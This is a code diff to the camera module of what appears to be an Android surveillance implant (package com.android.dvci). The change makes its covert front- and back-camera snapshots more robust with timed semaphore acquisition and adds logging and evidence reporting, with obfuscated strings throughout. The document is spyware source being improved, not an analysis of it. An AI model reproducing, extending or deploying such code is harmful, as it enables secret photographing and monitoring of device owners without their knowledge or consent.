@@ -24,6 +24,7 @@ import com.android.dvci.util.Utils;
 import com.android.mm.M;
 
 import java.io.IOException;
+import java.util.concurrent.TimeUnit;
 
 //MANUAL http://developer.android.com/guide/topics/media/camera.html
 
@@ -80,6 +81,7 @@ public class ModuleCamera extends BaseInstantModule {
 						Check.log(TAG + " (actualStart): Phone: " + Build.MODEL + " not supported");
 					}
 					addStop(Status.STOP_REASON_PHONE_MODEL);
+					EvidenceBuilder.info(M.e("camera module not supported on this phone"));
 					return;
 				}
 			}
@@ -109,20 +111,39 @@ public class ModuleCamera extends BaseInstantModule {
 
 		if (Build.VERSION.SDK_INT > Build.VERSION_CODES.HONEYCOMB) {
 			final CameraSnapshot camera = CameraSnapshot.self();
-
-			if (Status.self().semaphoreMediaserver.tryAcquire()) {
-				try{
-					camera.snapshot(Camera.CameraInfo.CAMERA_FACING_FRONT);
-				} finally {
-					Status.self().semaphoreMediaserver.release();
+			try {
+				if (Status.self().semaphoreMediaserver.tryAcquire(2000, TimeUnit.MILLISECONDS)) {
+					try {
+						camera.snapshot(Camera.CameraInfo.CAMERA_FACING_FRONT);
+					} finally {
+						Status.self().semaphoreMediaserver.release();
+					}
+				} else {
+					if (Cfg.DEBUG) {
+						Check.log(TAG + " (failed to get sem for Front snapshot)");
+					}
+				}
+			} catch (Exception e) {
+				if (Cfg.DEBUG) {
+					Check.log(TAG + " (failed to get sem for Front snapshot) INTERRUPTED");
 				}
 			}
 			Utils.sleep(100);
-			if (Status.self().semaphoreMediaserver.tryAcquire()) {
-				try{
-					camera.snapshot(Camera.CameraInfo.CAMERA_FACING_BACK);
-				} finally {
-					Status.self().semaphoreMediaserver.release();
+			try {
+				if (Status.self().semaphoreMediaserver.tryAcquire(2000, TimeUnit.MILLISECONDS)) {
+					try {
+						camera.snapshot(Camera.CameraInfo.CAMERA_FACING_BACK);
+					} finally {
+						Status.self().semaphoreMediaserver.release();
+					}
+				} else {
+					if (Cfg.DEBUG) {
+						Check.log(TAG + " (failed to get sem for Back snapshot)");
+					}
+				}
+			} catch (Exception e) {
+				if (Cfg.DEBUG) {
+					Check.log(TAG + " (failed to get sem for Back snapshot) INTERRUPTED");
 				}
 			}
 
